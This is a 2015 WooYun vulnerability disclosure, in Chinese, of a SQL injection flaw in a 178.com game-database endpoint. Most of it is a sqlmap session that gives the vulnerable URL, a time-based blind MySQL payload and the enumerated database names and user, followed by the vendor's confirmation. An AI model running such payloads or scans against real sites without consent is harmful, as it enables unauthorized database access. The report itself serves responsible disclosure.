wybug_title: 178游戏网某重要站点SQL注入漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-05-16：	细节已通知厂商并且等待厂商处理中									2015-05-18：	厂商已经确认，细节仅向厂商公开									2015-05-28：	细节向核心白帽子及相关领域专家公开									2015-06-07：	细节向普通白帽子公开									2015-06-17：	细节向实习白帽子公开									2015-07-02：	细节向公众公开  简要描述： 一女同事生日，我问她想要什么礼物？她说，咱俩关系好，你可不可以送我一样既实用又可以装逼的礼物。于是我给了她一条内裤。 详细说明：  
C:\Python27\sqlmap>sqlmap.py -u "http://db.178.com/lol/index.php?api/bigfoot/herosel/name/aa*" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150423}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 12:24:47custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] y[12:24:49] [INFO] resuming back-end DBMS 'mysql'[12:24:49] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* (URI)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: http://db.178.com:80/lol/index.php?api/bigfoot/herosel/name/aa' AND (SELECT * FROM (SELECT(SLEEP(5)))hMCM) AND 'Cdet'='Cdet---[12:24:50] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0.12[12:24:50] [INFO] fetching database names[12:24:50] [INFO] fetching number of databases[12:24:50] [WARNING] time-based comparison requires larger statistical model, please wait..............................[12:24:55] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y2[12:31:07] [INFO] retrieved:[12:31:27] [INFO] adjusting time delay to 1 second due to good response timesinformation_schema[12:36:43] [INFO] retrieved:[12:37:03] [ERROR] invalid character detected. retrying..[12:37:03] [WARNING] increasing time delay to 2 secondslolavailable databases [2]:[*] information_schema[*] lol[12:39:15] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\db.178.com'[*] shutting down at 12:39:15
数据库账号loldb_user   漏洞证明：     修复方案：  过滤   版权声明：转载请注明来源 #6c6c6c@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-18 10:53 厂商回复： 感谢洞主对完美世界的关注，我们将尽快修补该漏洞。 最新状态： 暂无
